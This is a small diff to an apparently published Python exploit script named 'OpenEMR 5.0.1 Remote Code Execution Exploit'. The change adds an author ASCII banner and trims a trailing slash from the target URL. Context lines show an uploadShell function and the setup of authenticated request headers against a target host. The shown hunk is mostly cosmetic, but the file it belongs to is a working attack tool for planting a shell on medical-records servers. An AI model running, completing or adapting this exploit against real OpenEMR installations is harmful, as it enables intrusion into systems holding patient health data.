@@ -73,10 +73,25 @@ def uploadShell(target, s, header, data):
         print('[-]ERROR')
 
 
+print (
+'''
+  ___                   _____ __  __ ____  
+ / _ \ _ __   ___ _ __ | ____|  \/  |  _ \ 
+| | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |
+| |_| | |_) |  __/ | | | |___| |  | |  _ < 
+ \___/| .__/ \___|_| |_|_____|_|  |_|_| \_
+      |_|                                  
+############################################
+              @EmreOvunc
+############################################
+'''
+)
 print('[!]OpenEMR 5.0.1 Remote Code Execution Exploit')
 
 if args.target is not None and args.username is not None and args.password is not None:
     target = args.target
+    if target.endswith('/'):
+        target = target[:-1]
 
     headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0",
                "Origin": target,
